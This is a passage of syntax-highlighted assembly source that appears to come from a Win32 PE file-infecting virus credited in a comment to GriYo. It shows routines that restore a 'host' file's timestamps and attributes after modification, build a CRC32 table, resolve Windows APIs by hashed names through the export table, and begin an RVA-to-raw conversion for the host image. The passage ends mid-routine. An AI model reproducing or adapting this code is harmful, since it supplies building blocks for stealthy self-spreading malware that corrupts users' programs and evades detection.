        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_CreateFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileTime</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Close handle created by CreateFileA</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Close_Create</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_CreateFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Restore file attributes</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Restore_Attrib</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CurFileAttr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufStrFilename</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                
</span><span class="sc5">e_OpenMapFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Make crc lookup table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Generate a table for a byte-wise 32-bit CRC calculation on the polynomial:</span><span class="sc0">
</span><span class="sc1">;x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Polynomials over GF(2) are represented in binary, one bit per coefficient,</span><span class="sc0">
</span><span class="sc1">;with the lowest powers in the most significant bit.  Then adding polynomials</span><span class="sc0">
</span><span class="sc1">;is just exclusive-or, and multiplying a polynomial by x is a right shift by</span><span class="sc0">
</span><span class="sc1">;one.  If we call the above polynomial p, and represent a byte as the</span><span class="sc0">
</span><span class="sc1">;polynomial q, also with the lowest power in the most significant bit (so the</span><span class="sc0">
</span><span class="sc1">;byte 0xb1 is the polynomial x^7+x^3+x+1), then the CRC is (q*x^32) mod p,</span><span class="sc0">
</span><span class="sc1">;where a mod b means the remainder after dividing a by b.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This calculation is done using the shift-register method of multiplying and</span><span class="sc0">
</span><span class="sc1">;taking the remainder.  The register is initialized to zero, and for each</span><span class="sc0">
</span><span class="sc1">;incoming bit, x^32 is added mod p to the register if the bit is a one (where</span><span class="sc0">
</span><span class="sc1">;x^32 mod p is p+x^32 = x^26+...+1), and the register is multiplied mod p by</span><span class="sc0">
</span><span class="sc1">;x (which is shifting right by one and adding x^32 mod p if the bit shifted</span><span class="sc0">
</span><span class="sc1">;out is a one).  We start with the highest power (least significant bit) of</span><span class="sc0">
</span><span class="sc1">;q and repeat for all eight bits of q.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The table is simply the CRC of all possible eight bit values.  This is all</span><span class="sc0">
</span><span class="sc1">;the information needed to generate CRC's on data a byte at a time for all</span><span class="sc0">
</span><span class="sc1">;combinations of CRC register values and incoming bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Original C code by Mark Adler</span><span class="sc0">
</span><span class="sc1">;Translated to asm for Win32 by GriYo</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">make_crc_tbl</span><span class="sc4">:</span><span class="sc0">   

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Make exclusive-or pattern from polynomial (0EDB88320h)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The following commented code is an example of how to</span><span class="sc0">
</span><span class="sc1">;make the exclusive-or pattern from polynomial</span><span class="sc0">
</span><span class="sc1">;at runtime     </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       xor edx,edx</span><span class="sc0">
</span><span class="sc1">;       mov ecx,0000000Eh</span><span class="sc0">
</span><span class="sc1">;       lea ebx,dword ptr [ebp+tbl_terms]</span><span class="sc0">
</span><span class="sc1">;calc_poly: mov eax,ecx</span><span class="sc0">
</span><span class="sc1">;       xlatb</span><span class="sc0">
</span><span class="sc1">;       sub eax,0000001Fh</span><span class="sc0">
</span><span class="sc1">;       neg eax</span><span class="sc0">
</span><span class="sc1">;       bts edx,eax</span><span class="sc0">
</span><span class="sc1">;       loop calc_poly</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       edx contains now the exclusive-or pattern</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The polynomial is:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; X^32+X^26+X^23+X^22+X^16+X^12+X^11+X^10+X^8+X^7+X^5+X^4+X^2+X^1+X^0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;tbl_terms      db 0,1,2,4,5,7,8,10,11,12,16,22,23,26</span><span class="sc0">
</span><span class="sc1">;               </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000100h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_crc32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">crc_tbl_do</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000FFh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">               
</span><span class="sc5">make_crc_value</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">next_value</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0EDB88320h</span><span class="sc0">
</span><span class="sc5">next_value</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">make_crc_value</span><span class="sc0">             
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crc_tbl_do</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Return a 32bit CRC of the contents of the buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Ptr to buffer</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Buffer size</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; 32bit CRC</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_crc32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_crc32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">crc_calc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000FFh</span><span class="sc0">               
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get a 32bit CRC of a null terminated array</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Ptr to string</span><span class="sc0">
</span><span class="sc1">;Exit:</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; 32bit CRC</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_str_crc32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">crc_sz</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">crc_sz</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_crc32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get the entry-point of GetProcAddress</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       ebx -&gt; KERNELL32 base address</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Address of GetProcAddress</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">GetGetProcAddr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">NT_OptionalHeader.</span><span class="sc0">           \
                                   </span><span class="sc5">OH_DirectoryEntries.</span><span class="sc0">         \
                                   </span><span class="sc5">DE_Export.</span><span class="sc0">               \
                                   </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNameOrdinals</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">                

</span><span class="sc5">function_loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Get ptr to API name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_str_crc32</span><span class="sc0">      </span><span class="sc1">;Get CRC32 of API name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CrcGetProcAddr</span><span class="sc4">]</span><span class="sc0">                  
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">API_found</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">function_loop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">API_found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get the entry-point of each needed API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This routine uses the CRC32 instead of API names</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       ebx -&gt; Base address of DLL</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Number of APIs in the folling buffer</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Buffer filled with the CRC32 of each API name</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Recives found API addresses</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Is 00000000h if everything was ok</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_APIs</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cld</span><span class="sc0">             
</span><span class="sc5">get_each_API</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get a pointers to the EXPORT data</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">NT_OptionalHeader.</span><span class="sc0">           \
                                   </span><span class="sc5">OH_DirectoryEntries.</span><span class="sc0">         \
                                   </span><span class="sc5">DE_Export.</span><span class="sc0">               \
                                   </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">                

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Try to find tha API name that matches given CRC32</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">API_Loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;Ptr to AddressOfNames</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get ptr to API name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;Save ptr to API name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_str_crc32</span><span class="sc0">      </span><span class="sc1">;Get CRC32 of API name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CRC_API_found</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;Remove API name from stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;Ptr to RVA for next API name </span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">API_Loop</span><span class="sc0">
</span><span class="sc5">get_API_error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;Ptr to CRC's of API names</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;Number of API's</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;Exit with error (ecx!=NULL)</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;The ptr to API name is already on stack, now push the</span><span class="sc0">
        </span><span class="sc1">;module handle and call GetProcAddress</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CRC_API_found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">     </span><span class="sc1">;Dont let the API call change this</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;Remove ptr to RVA for next name</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_API_error</span><span class="sc1">;If GetProcAddress returned NULL exit</span><span class="sc0">
                
        </span><span class="sc6">stosd</span><span class="sc0">       </span><span class="sc1">;Save the API address into given table</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;Ptr to CRC's of API names</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_each_API</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Convert RVA to RAW</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       ebx -&gt; Host base address</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; RVA to convert</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Pointer to RAW data or NULL if error</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; Section delta offset</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Pointer to IMAGE_OPTIONAL_HEADER</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Pointer to section header                </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">RVA2RAW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cld</span><span class="sc0">
